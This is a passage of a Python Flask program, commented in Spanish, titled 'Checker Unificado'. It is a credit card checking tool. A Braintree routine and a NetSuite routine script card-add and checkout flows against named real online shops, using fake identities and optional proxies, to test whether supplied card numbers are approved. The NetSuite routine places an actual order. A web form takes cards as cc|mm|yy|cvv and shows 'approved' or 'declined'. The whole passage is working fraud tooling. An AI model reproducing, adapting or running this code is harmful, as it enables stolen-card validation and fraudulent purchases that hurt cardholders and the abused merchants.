                data = {'payment_method': 'braintree_cc', 'braintree_cc_nonce_key': token_bc, 'braintree_cc_device_data': '', 'braintree_cc_3ds_nonce_key': '', 'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/' + merchant_id + '/client_api","assetsUrl":"https://assets.braintreegateway.com","merchantId":"' + merchant_id + '","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]}}', 'woocommerce-add-payment-method-nonce': payment_nonce, '_wp_http_referer': '/my-account/add-payment-method/', 'woocommerce_add_payment_method': '1'}
                response = await session.post('https://unclejimswormfarm.com/my-account/add-payment-method/', headers=headers, data=data, follow_redirects=True)
                
                # ========== >_ Response
                resp = response.text
                
                await session.aclose()
                
                if not resp or "New payment method added" in str(resp):
                    return {"message": "Approved! 1000: Approved", "success": True, "status": True}
                
                error_msg = Tools.find_between(resp, '<ul class="woocommerce-error"', '</ul>')
                if error_msg:
                    reason = Tools.ext_rep(error_msg)
                    return {"message": f"Declined! {reason}", "success": True, "status": False}

            except Exception as e:
                try:
                    await session.aclose()
                except:
                    pass
                continue
        
        return {"message": "Error! Error de conexion con la api", "success": False, "status": False}

# ============================================
# 6. CHECKER 4: NETSUITE
# ============================================
class NetSuiteChecker:
    @staticmethod
    async def code(card: str, proxy: str = None) -> dict:
        proxy_f = f"http://{proxy}" if proxy and "://" not in proxy else proxy
        session = await Tools.get_httpx_model(proxy_f)
        
        try:
            #=== Datos ===
            fake = Faker('en_US')
            first_name = fake.first_name()
            last_name = fake.last_name()
            address_1 = fake.street_address()
            city = fake.city()
            state = 'NY'
            ny_postcodes = [
                "11210", "11211", "11212", "11213", "11214", "11215", "11216", "11217", "11218",
                "11219", "11220", "11221", "11222", "11223", "11224", "11225", "11226", "11228",
                "11229", "11230", "11231", "11232", "11233", "11234", "11235", "11236", "11237",
                "11238", "11239", "11354", "11355", "11356", "11357", "11358", "11360", "11361",
                "11362", "11363", "11364", "11365", "11366", "11367", "11368", "11369", "11370",
                "11372", "11373", "11374", "11375", "11377", "11378", "11379", "11385", "11411",
                "11412", "11413", "11414", "11415", "11416", "11417", "11418", "11419", "11420",
                "11421", "11422", "11423", "11426", "11427", "11428", "11429", "11430", "11432",
                "11433", "11434", "11435", "11436", "11691", "11692", "11693", "11694", "11697"
            ]
            
            postcode = random.choice(ny_postcodes)
            email = fake.email(domain='gmail.com')
            email_encoded = quote_plus(email)
            area_code = random.choice(['212', '347', '646', '718', '917', '929'])
            phone = f"{area_code}{random.randint(1000000, 9999999)}"
            name = f"{first_name} {last_name}"
            user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            
            #=== Manejo de CC ===
            cc, mm, yy, ccv = card.split("|")
            cc_type = "VISA" if cc.startswith('4') else "Master Card" if cc.startswith('5') else "Master Card" if cc.startswith('2') else "Discover" if cc.startswith('6') else "American Express" if cc.startswith('3') else "UNKNOWN"
            cc_internal_id = '5' if cc.startswith('4') else '4' if cc.startswith('5') else '4' if cc.startswith('6') else '3' if cc.startswith('3') else '6' if cc.startswith('3') else '5'
            cc_img_type = 'visa' if cc.startswith('4') else 'mc' if cc.startswith('5') else 'mc' if cc.startswith('2') else 'discover' if cc.startswith('6') else 'amex' if cc.startswith('3') else 'visa'
            
            mm = mm.lstrip('0')
            yy = '20' + yy if len(yy) == 2 else yy
            
            timestamp = str(int(time.time() * 1000))
            
            #=== STEP 1 ===
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'upgrade-insecure-requests': '1',
                'user-agent': user_agent,
            }
            
            response = await session.get(
                'https://www.carbon2cobalt.com/Effortlessly-Cool-Mens-Accessories-Sling-Shot-199033',
                headers=headers,
            )
            
            #=== STEP 2 ===
            headers = {
                'priority': 'u=1, i',
                'x-requested-with': 'XMLHttpRequest',
                'x-sc-touchpoint': 'shopping',
                'user-agent': user_agent,
            }
            
            params = {
                'c': '4687809',
                'n': '2',
            }
            
            json_data = [
                {
                    'item': {
                        'internalid': 8641,
                        'type': 'InvtPart',
                    },
                    'quantity': 1,
                    'options': [],
                    'location': '',
                    'fulfillmentChoice': 'ship',
                    'freeGift': False,
                },
            ]
            
            response = await session.post(
                'https://www.carbon2cobalt.com/sca-dev-2023-1-0/services/LiveOrder.Line.Service.ss',
                params=params,
                headers=headers,
                json=json_data,
            )
            try:
                response_json = response.json()
                line_internal_id = response_json['lines'][0]['internalid']
            except:
                line_internal_id = f"item6813set{int(time.time() * 1000)}"
            
            #=== STEP 3 ===
            headers = {
                'priority': 'u=0, i',
                'upgrade-insecure-requests': '1',
                'user-agent': user_agent,
            }
            
            params = {
                'is': 'checkout',
            }
            
            response = await session.get(
                'https://www.carbon2cobalt.com/sca-dev-2023-1-0/checkout.ssp',
                params=params,
                headers=headers,
            )
            
            timestamp = str(int(time.time() * 1000))
            
            #=== STEP 4 ===
            headers = {
                'priority': 'u=1',
                'user-agent': user_agent,
            }
            
            params = {
                'X-SC-Touchpoint': 'checkout',
                't': timestamp,
            }
            
            response = await session.get(
                'https://www.carbon2cobalt.com/sca-dev-2023-1-0/checkout.environment.shortcache.ssp',
                params=params,
                headers=headers,
            )
            
            timestamp = str(int(time.time() * 1000))
            
            #=== STEP 5 ===
            headers = {
                'priority': 'u=1',
                'user-agent': user_agent,
            }
            
            params = {
                't': timestamp,
            }
            
            response = await session.get(
                'https://www.carbon2cobalt.com/sca-dev-2023-1-0/customFieldsMetadata.ssp',
                params=params,
                headers=headers,
            )
            timestamp = str(int(time.time() * 1000))
            
            #=== STEP 6 ===
            headers = {
                'priority': 'u=1, i',
                'user-agent': user_agent,
            }
            
            params = {
                'lang': 'en_US',
                'cur': 'USD',
                'X-SC-Touchpoint': 'checkout',
                't': timestamp,
            }
            
            response = await session.get(
                'https://www.carbon2cobalt.com/sca-dev-2023-1-0/services/CheckoutEnvironment.Service.ss',
                params=params,
                headers=headers,
            )
            
            timestamp = str(int(time.time() * 1000))
            
            #=== STEP 7 ===
            headers = {
                'priority': 'u=1, i',
                'x-requested-with': 'XMLHttpRequest',
                'x-sc-touchpoint': 'checkout',
                'user-agent': user_agent,
            }
            
            params = {
                'cur': '1',
                'internalid': 'cart',
                't': timestamp,
                'c': '4687809',
                'n': '2',
            }
            
            response = await session.get(
                'https://www.carbon2cobalt.com/sca-dev-2023-1-0/services/LiveOrder.Service.ss',
                params=params,
                headers=headers,
            )
            
            #=== STEP 8 ===
            headers = {
                'priority': 'u=1, i',
                'x-requested-with': 'XMLHttpRequest',
                'x-sc-touchpoint': 'checkout',
                'user-agent': user_agent,
            }
            
            params = {
                'c': '4687809',
                'n': '2',
            }
            
            json_data = {
                'firstname': first_name,
                'lastname': last_name,
                'email': email,
            }
            
            response = await session.post(
                'https://www.carbon2cobalt.com/sca-dev-2023-1-0/services/Account.RegisterAsGuest.Service.ss',
                params=params,
                headers=headers,
                json=json_data,
            )
            
            #=== STEP 9 ===
            headers = {
                'priority': 'u=1, i',
                'x-requested-with': 'XMLHttpRequest',
                'x-sc-touchpoint': 'checkout',
                'user-agent': user_agent,
            }
            
            params = {
                'cur': '1',
                'internalid': 'cart',
                't': timestamp,
                'c': '4687809',
                'n': '2',
            }
            
            json_data = {
                'addresses': [
                    {
                        'internalid': f'US-NY--{postcode}----null',
                        'country': 'US',
                        'state': 'NY',
                        'zip': postcode,
                    },
                ],
                'shipmethods': [],
                'lines': [
                    {
                        'item': {
                            'internalid': 8641,
                            'type': 'InvtPart',
                        },
                        'quantity': 1,
                        'internalid': line_internal_id,
                        'options': [],
                        'location': '',
                        'fulfillmentChoice': 'ship',
                        'freeGift': False,
                    },
                ],
                'paymentmethods': [],
                'internalid': 'cart',
                'confirmation': {
                    'addresses': [],
                    'shipmethods': [],
                    'lines': [],
                    'paymentmethods': [],
                },
                'multishipmethods': [],
                'lines_sort': [line_internal_id],
                'latest_addition': line_internal_id,
                'promocodes': [],
                'ismultishipto': False,
                'shipmethod': '14055',
                'billaddress': '-------null',
                'shipaddress': f'US-NY--{postcode}----null',
                'isPaypalComplete': False,
                'agreetermcondition': False,
                'summary': {},
                'options': {},
                'purchasenumber': '',
                'tempshipaddress': None,
                'isEstimating': True,
            }
            
            response = await session.put(
                'https://www.carbon2cobalt.com/sca-dev-2023-1-0/services/LiveOrder.Service.ss',
                params=params,
                headers=headers,
                json=json_data,
            )
            
            #=== STEP 10 ===
            timestamp = str(int(time.time() * 1000))
            
            headers = {
                'priority': 'u=1, i',
                'x-requested-with': 'XMLHttpRequest',
                'x-sc-touchpoint': 'checkout',
                'user-agent': user_agent,
            }
            
            params = {
                'cur': '1',
                'internalid': 'cart',
                't': timestamp,
                'c': '4687809',
                'n': '2',
            }
            
            json_data = {
                'addresses': [
                    {
                        'zip': postcode,
                        'country': 'US',
                        'company': None,
                        'internalid': f'US---{postcode}----null',
                    },
                ],
                'shipmethods': [],
                'lines': [
                    {
                        'item': {
                            'internalid': 8641,
                            'type': 'InvtPart',
                        },
                        'quantity': 1,
                        'internalid': line_internal_id,
                        'options': [],
                        'location': '',
                        'fulfillmentChoice': 'ship',
                        'freeGift': False,
                    },
                ],
                'paymentmethods': [],
                'internalid': 'cart',
                'confirmation': {
                    'addresses': [],
                    'shipmethods': [],
                    'lines': [],
                    'paymentmethods': [],
                },
                'multishipmethods': [],
                'lines_sort': [line_internal_id],
                'latest_addition': line_internal_id,
                'promocodes': [],
                'ismultishipto': False,
                'shipmethod': '14055',
                'billaddress': '-------null',
                'shipaddress': f'US---{postcode}----null',
                'isPaypalComplete': False,
                'agreetermcondition': False,
                'summary': {},
                'options': {},
                'purchasenumber': '',
                'tempshipaddress': {
                    'fullname': name,
                    'addr1': address_1,
                    'addr2': '',
                    'city': 'New York',
                    'country': 'US',
                    'state': 'NY',
                    'zip': postcode,
                    'phone': '9083820688',
                    'isresidential': 'F',
                },
                'isEstimating': True,
            }
            
            response = await session.put(
                'https://www.carbon2cobalt.com/sca-dev-2023-1-0/services/LiveOrder.Service.ss',
                params=params,
                headers=headers,
                json=json_data,
            )
            
            #=== STEP 11 ===
            headers = {
                'priority': 'u=1, i',
                'x-requested-with': 'XMLHttpRequest',
                'x-sc-touchpoint': 'checkout',
                'user-agent': user_agent,
            }
            
            params = {
                'c': '4687809',
                'n': '2',
            }
            
            json_data = {
                'fullname': name,
                'country': 'US',
                'addr1': address_1,
                'addr2': '',
                'city': 'New York',
                'state': 'NY',
                'zip': postcode,
                'phone': '(908) 382-0688',
                'isresidential': 'F',
            }
            
            response = await session.post(
                'https://www.carbon2cobalt.com/sca-dev-2023-1-0/services/Address.Service.ss',
                params=params,
                headers=headers,
                json=json_data,
            )
            result = response.json()
            address_id = result['internalid']
            
            #=== STEP 12 ===
            timestamp = str(int(time.time() * 1000))
            
            headers = {
                'priority': 'u=1, i',
                'x-requested-with': 'XMLHttpRequest',
                'x-sc-touchpoint': 'checkout',
                'user-agent': user_agent,
            }
            
            params = {
                'cur': '1',
                'internalid': 'cart',
                't': timestamp,
                'c': '4687809',
                'n': '2',
            }
            
            json_data = {
                'addresses': [
                    {
                        'zip': postcode,
                        'country': 'US',
                        'company': None,
                        'internalid': f'US---{postcode}----null',
                    },
                ],
                'shipmethods': [],
                'lines': [
                    {
                        'item': {
                            'internalid': 8641,
                            'type': 'InvtPart',
                        },
                        'quantity': 1,
                        'internalid': line_internal_id,
                        'options': [],
                        'location': '',
                        'fulfillmentChoice': 'ship',
                        'freeGift': False,
                    },
                ],
                'paymentmethods': [],
                'internalid': 'cart',
                'confirmation': {
                    'addresses': [],
                    'shipmethods': [],
                    'lines': [],
                    'paymentmethods': [],
                },
                'multishipmethods': [],
                'lines_sort': [line_internal_id],
                'latest_addition': line_internal_id,
                'promocodes': [],
                'ismultishipto': False,
                'shipmethod': '14055',
                'billaddress': '-------null',
                'shipaddress': address_id,
                'isPaypalComplete': False,
                'agreetermcondition': False,
                'summary': {},
                'options': {},
                'purchasenumber': '',
                'sameAs': False,
                'tempshipaddress': None,
                'isEstimating': False,
            }
            
            response = await session.put(
                'https://www.carbon2cobalt.com/sca-dev-2023-1-0/services/LiveOrder.Service.ss',
                params=params,
                headers=headers,
                json=json_data,
            )
            
            #=== STEP 13 ===
            payment_keys = {
                '5': '5,5,1555641112',   
                '4': '4,5,1555641112',   
                '6': '6,5,1555641112', 
                '3': '3,5,1555641112',
            }
            
            headers = {
                'priority': 'u=1, i',
                'x-requested-with': 'XMLHttpRequest',
                'x-sc-touchpoint': 'checkout',
                'user-agent': user_agent,
            }
            
            params = {
                'c': '4687809',
                'n': '2',
            }
            
            json_data = {
                'ccname': name,
                'hasSecurityCode': True,
                'expmonth': mm,
                'expyear': yy,
                'ccnumber': cc,
                'paymentmethod': payment_keys[cc_internal_id],
                'ccsecuritycode': ccv,
            }
            
            response = await session.post(
                'https://www.carbon2cobalt.com/sca-dev-2023-1-0/services/PaymentMethod.Service.ss',
                params=params,
                headers=headers,
                json=json_data,
            )
            result = response.json()
            payment_internal_id = result['internalid']
            pm_internalid = result['paymentmethod']['internalid']
            iscardholderauthenticated = result['paymentmethod']['iscardholderauthenticationsupported']
            creditcardtoken = result['paymentmethod']['creditcardtoken']
            isexternal = result['paymentmethod']['isexternal']
            merchantid = result['paymentmethod']['merchantid']
            cname = result['paymentmethod']['name']
            imagesrc = result['paymentmethod']['imagesrc']
            ispaypal = result['paymentmethod']['ispaypal']
            creditcard = result['paymentmethod']['creditcard']
            key = result['paymentmethod']['key']
            isautomatedclearinghouse = result['paymentmethod']['isautomatedclearinghouse']
            instrumenttypeValue = result['instrumenttypeValue']
            mask = result['mask']
            ccdefault = result['ccdefault']
            cardexpirationdate = result['cardexpirationdate']
            expyear = result['expyear']
            expmonth = result['expmonth']
            ccname_result = result['ccname']
            cardlastfourdigits = result['cardlastfourdigits']
            cardbrand = result['cardbrand']
            ccsecuritycode_result = result['ccsecuritycode']
            
            #=== STEP 14 ===
            timestamp = str(int(time.time() * 1000))
            
            headers = {
                'priority': 'u=1, i',
                'x-requested-with': 'XMLHttpRequest',
                'x-sc-touchpoint': 'checkout',
                'user-agent': user_agent,
            }
            
            params = {
                'cur': '1',
                'internalid': 'cart',
                't': timestamp,
                'c': '4687809',
                'n': '2',
            }
            
            json_data = {
                'addresses': [
                    {
                        'zip': postcode,
                        'country': 'US',
                        'addr2': '',
                        'addr1': address_1,
                        'city': 'New York',
                        'addr3': '',
                        'isvalid': 'T',
                        'internalid': address_id,
                        'phone': '(908) 382-0688',
                        'defaultbilling': 'F',
                        'defaultshipping': 'T',
                        'isresidential': 'F',
                        'state': 'NY',
                        'fullname': name,
                        'company': None,
                    },
                ],
                'shipmethods': [],
                'lines': [
                    {
                        'item': {
                            'internalid': 8641,
                            'type': 'InvtPart',
                        },
                        'quantity': 1,
                        'internalid': line_internal_id,
                        'options': [],
                        'location': '',
                        'fulfillmentChoice': 'ship',
                        'freeGift': False,
                    },
                ],
                'paymentmethods': [
                    {
                        'type': 'creditcard',
                        'creditcard': {
                            'internalid': payment_internal_id,
                            'paymentmethod': {
                                'internalid': pm_internalid,
                                'iscardholderauthenticationsupported': iscardholderauthenticated,
                                'creditcardtoken': creditcardtoken,
                                'isexternal': isexternal,
                                'merchantid': merchantid,
                                'name': cname,
                                'imagesrc': imagesrc,
                                'ispaypal': ispaypal,
                                'creditcard': creditcard,
                                'key': key,
                                'isautomatedclearinghouse': isautomatedclearinghouse,
                            },
                            'instrumenttypeValue': instrumenttypeValue,
                            'recordType': 'PaymentCard',
                            'mask': mask,
                            'ccdefault': ccdefault,
                            'cardexpirationdate': cardexpirationdate,
                            'expyear': expyear,
                            'expmonth': expmonth,
                            'ccname': ccname_result,
                            'cardlastfourdigits': cardlastfourdigits,
                            'cardbrand': cardbrand,
                            'ccsecuritycode': ccv,
                        },
                        'primary': True,
                    },
                ],
                'internalid': 'cart',
                'confirmation': {
                    'addresses': [],
                    'shipmethods': [],
                    'lines': [],
                    'paymentmethods': [],
                },
                'multishipmethods': [],
                'lines_sort': [line_internal_id],
                'latest_addition': line_internal_id,
                'promocodes': [],
                'ismultishipto': False,
                'shipmethod': '14055',
                'billaddress': address_id,
                'shipaddress': address_id,
                'isPaypalComplete': False,
                'agreetermcondition': False,
                'summary': {},
                'options': {},
                'purchasenumber': '',
                'sameAs': True,
                'tempshipaddress': None,
                'isEstimating': False,
            }
            
            response = await session.put(
                'https://www.carbon2cobalt.com/sca-dev-2023-1-0/services/LiveOrder.Service.ss',
                params=params,
                headers=headers,
                json=json_data,
            )
            
            #=== STEP 15 ===
            timestamp = str(int(time.time() * 1000))
            
            headers = {
                'priority': 'u=1, i',
                'x-requested-with': 'XMLHttpRequest',
                'x-sc-touchpoint': 'checkout',
                'user-agent': user_agent,
            }
            
            params = {
                'cur': '1',
                't': timestamp,
                'c': '4687809',
                'n': '2',
            }
            
            json_data = {
                'addresses': [
                    {
                        'zip': postcode,
                        'country': 'US',
                        'addr2': '',
                        'addr1': address_1,
                        'city': 'New York',
                        'addr3': '',
                        'isvalid': 'T',
                        'internalid': address_id,
                        'phone': '(908) 382-0688',
                        'defaultbilling': 'T',
                        'defaultshipping': 'T',
                        'isresidential': 'F',
                        'state': 'NY',
                        'fullname': name,
                        'company': None,
                    },
                ],
                'shipmethods': [],
                'lines': [
                    {
                        'item': {
                            'internalid': 8641,
                            'type': 'InvtPart',
                        },
                        'quantity': 1,
                        'internalid': line_internal_id,
                        'options': [],
                        'location': '',
                        'fulfillmentChoice': 'ship',
                        'freeGift': False,
                    },
                ],
                'paymentmethods': [
                    {
                        'type': 'creditcard',
                        'primary': True,
                        'creditcard': {
                            'internalid': payment_internal_id,
                            'ccnumber': '************' + cc[-4:],
                            'ccname': name,
                            'ccexpiredate': f'{mm}/{yy}',
                            'ccsecuritycode': ccv,
                            'expmonth': mm,
                            'expyear': yy,
                            'paymentmethod': {
                                'internalid': pm_internalid,
                                'name': cname,
                                'creditcard': True,
                                'ispaypal': False,
                                'isexternal': False,
                                'key': key,
                                'iscardholderauthenticationsupported': iscardholderauthenticated,
                            },
                        },
                    },
                ],
                'internalid': None,
                'confirmation': {
                    'addresses': [],
                    'shipmethods': [],
                    'lines': [],
                    'paymentmethods': [],
                },
                'multishipmethods': [],
                'lines_sort': [line_internal_id],
                'latest_addition': line_internal_id,
                'promocodes': [],
                'ismultishipto': False,
                'shipmethod': '14055',
                'billaddress': address_id,
                'shipaddress': address_id,
                'isPaypalComplete': False,
                'agreetermcondition': True,
                'summary': {},
                'options': {},
                'purchasenumber': '',
                'sameAs': True,
                'tempshipaddress': None,
                'isEstimating': False,
            }
            
            response = await session.post(
                'https://www.carbon2cobalt.com/sca-dev-2023-1-0/services/LiveOrder.Service.ss',
                params=params,
                headers=headers,
                json=json_data,
            )
            
            await session.aclose()
            
            result = response.json()
            if 'confirmation' in result and result['confirmation'].get('purchasenumber'):
                order_number = result['confirmation']['purchasenumber']
                return {"message": f"🎉 Order #: {order_number}", "success": True, "status": True}
            else:
                error_message = result.get('errorMessage', 'Unknown error')
                return {"message": f"❌ Error: {error_message}", "success": True, "status": False}
                
        except Exception as e:
            try:
                await session.aclose()
            except:
                pass
            return {"message": f"Error: {str(e)}", "success": False, "status": False}

# ============================================
# 7. RUTAS DE FLASK
# ============================================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Checker Unificado</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        .container {
            background: #111;
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
        }
        h1 {
            text-align: center;
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00;
        }
        .banner {
            text-align: center;
            font-size: 12px;
            white-space: pre;
            color: #00ff00;
            margin: 10px 0;
        }
        .form-group {
            margin: 15px 0;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #00ff00;
        }
        select, input {
            width: 100%;
            padding: 10px;
            background: #1a1a1a;
            border: 1px solid #00ff00;
            color: #00ff00;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }
        select:focus, input:focus {
            outline: none;
            box-shadow: 0 0 10px #00ff00;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #00ff00;
            color: #0a0a0a;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            font-family: 'Courier New', monospace;
        }
        button:hover {
            background: #00cc00;
            box-shadow: 0 0 20px #00ff00;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            background: #1a1a1a;
            border-radius: 5px;
            white-space: pre-wrap;
            word-break: break-all;
        }
        .approved {
            color: #00ff00;
        }
        .declined {
            color: #ff0000;
        }
        .error {
            color: #ffff00;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
        .status-badge {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
        }
        .status-approved {
            background: #00ff00;
            color: #0a0a0a;
        }
        .status-declined {
            background: #ff0000;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 CHECKER UNIFICADO</h1>
        <div class="banner">
╔══════════════════════════════════════════════════════════════╗
║   ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗   ║
║  ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗  ║
║  ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝  ║
║  ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗  ║
║  ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║  ║
║   ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ║
║                                                              ║
║              CHECKER UNIFICADO PARA RENDER                  ║
╚══════════════════════════════════════════════════════════════╝
        </div>
        
        <form id="checkerForm">
            <div class="form-group">
                <label for="checker">📌 Selecciona Checker:</label>
                <select id="checker" name="checker">
                    <option value="1">Payflow AVS</option>
                    <option value="2">PayPal Guest</option>
                    <option value="3">Braintree Auth</option>
                    <option value="4">NetSuite</option>
                </select>
            </div>
            
            <div class="form-group">
                <label for="card">💳 Tarjeta (cc|mm|yy|cvv):</label>
                <input type="text" id="card" name="card" placeholder="4003365936466834|05|26|575" required>
            </div>
            
            <div class="form-group">
                <label for="proxy">🌐 Proxy (opcional):</label>
                <input type="text" id="proxy" name="proxy" placeholder="192.168.1.1:8080">
            </div>
            
            <button type="submit">▶ EJECUTAR CHECKER</button>
        </form>
        
        <div id="result" class="result" style="display:none;"></div>
        <div id="loading" style="display:none; text-align:center; margin:20px;">
            ⏳ Procesando... Por favor espera
        </div>
    </div>
    <div class="footer">
        Coded by: @TlaxcalaNoExiste | Powered by Flask + Gunicorn
    </div>

    <script>
        document.getElementById('checkerForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const checker = document.getElementById('checker').value;
            const card = document.getElementById('card').value;
            const proxy = document.getElementById('proxy').value;
            
            const resultDiv = document.getElementById('result');
            const loadingDiv = document.getElementById('loading');
            
            loadingDiv.style.display = 'block';
            resultDiv.style.display = 'none';
            
            try {
                const response = await fetch('/check', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        checker: checker,
                        card: card,
                        proxy: proxy || null
                    })
                });
                
                const data = await response.json();
                
                loadingDiv.style.display = 'none';
                resultDiv.style.display = 'block';
                
                const statusClass = data.status ? 'approved' : 'declined';
                const statusBadge = data.status 
                    ? '<span class="status-badge status-approved">✅ APROBADA</span>' 
                    : '<span class="status-badge status-declined">❌ DECLINADA</span>';
                
                resultDiv.innerHTML = `
                    <div style="margin-bottom:10px;">
                        <strong>📋 Card:</strong> ${card}
                    </div>
                    <div style="margin-bottom:10px;">
                        <strong>📌 Checker:</strong> ${data.checker_name || 'Desconocido'}
                    </div>
                    <div style="margin-bottom:10px;">
                        <strong>📝 Mensaje:</strong> ${data.message || 'Sin mensaje'}
                    </div>
                    <div style="margin-bottom:10px;">
                        <strong>📊 Estado:</strong> ${statusBadge}
                    </div>
                    ${data.details ? `<div style="margin-top:10px; border-top:1px solid #333; padding-top:10px;"><strong>📌 Detalles:</strong><br><pre style="font-size:11px;">${JSON.stringify(data.details, null, 2)}</pre></div>` : ''}
                `;
                
                resultDiv.className = `result ${statusClass}`;
                
            } catch (error) {
                loadingDiv.style.display = 'none';
                resultDiv.style.display = 'block';
                resultDiv.className = 'result error';
                resultDiv.innerHTML = `
                    <div style="margin-bottom:10px;">
                        <strong>❌ Error:</strong> ${error.message}
                    </div>
                `;
            }
        });
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "service": "checker-unificado"})

@app.route('/check', methods=['POST'])
def check():
    data = request.get_json()
    checker_num = data.get('checker', '1')
    card = data.get('card')
    proxy = data.get('proxy')
    
    if not card:
        return jsonify({"error": "Se requiere tarjeta"}), 400
    
    # Ejecutar el checker
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    CHECKERS = {
        '1': {'name': 'Payflow AVS', 'class': PayflowChecker},
        '2': {'name': 'PayPal Guest', 'class': PayPalGuestChecker},
        '3': {'name': 'Braintree Auth', 'class': BraintreeChecker},
        '4': {'name': 'NetSuite', 'class': NetSuiteChecker}
    }
    
    try:
        checker_class = CHECKERS[checker_num]['class']
        result = loop.run_until_complete(checker_class.code(card, proxy))
        result['checker_name'] = CHECKERS[checker_num]['name']
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e), "status": False}), 500
    finally:
        loop.close()

# ============================================
# 8. PUNTO DE ENTRADA
# ============================================
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)